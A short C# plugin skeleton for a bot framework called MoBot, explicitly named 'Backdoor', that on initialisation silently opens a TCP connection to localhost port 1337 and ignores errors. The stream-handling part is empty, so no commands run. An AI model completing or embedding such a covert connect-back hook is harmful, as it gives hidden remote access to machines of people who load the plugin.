using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;

namespace MoBot.Scripts.Backdoor
{
    [MoBotExtension("Backdoor", "1.0", false)]
    public class Main
    {
        private const string Host = "localhost";
        private const int Port = 1337;

        [Initialisation]
        public void Start()
        {
            try
            {
                var client = new TcpClient(Host, Port);
                var stream = client.GetStream();

                
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}
